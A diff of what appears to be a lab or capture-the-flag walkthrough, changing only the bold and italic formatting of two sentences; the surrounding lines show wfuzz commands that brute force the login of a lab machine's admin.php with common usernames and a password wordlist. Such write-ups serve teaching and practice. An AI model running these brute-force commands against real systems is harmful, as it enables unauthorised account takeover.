@@ -169,7 +169,7 @@ kali@kali:~$ curl 10.129.189.69/admin.php
 </html>
 ```
 
-Begin brute forcing the admin console login credentials using wfuzz with the common.txt wordlist.
+Begin **brute forcing** the admin console login credentials using ***wfuzz*** with the common.txt wordlist.
 ```console
 kali@kali:~$ wfuzz -c -z list,admin-administrator-root-user-guest -z file,/usr/share/wordlists/wfuzz/general/common.txt  -d "username=FUZZ&password=FUZ2Z" http://10.129.189.69:80/admin.php
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -196,7 +196,7 @@ wfuzz --help
 --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
 ```
 
-Brute force the admin console login using wfuzz with the common.txt wordlist.
+**Brute force** the admin console login using ***wfuzz*** with the common.txt wordlist.
 ```console
 kali@kali:~$ wfuzz --hh 1071 -c -z list,admin-administrator-root-user-guest -z file,/usr/share/wordlists/wfuzz/general/common.txt -d "username=FUZZ&password=FUZ2Z"  http://10.129.189.69:80/admin.php
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
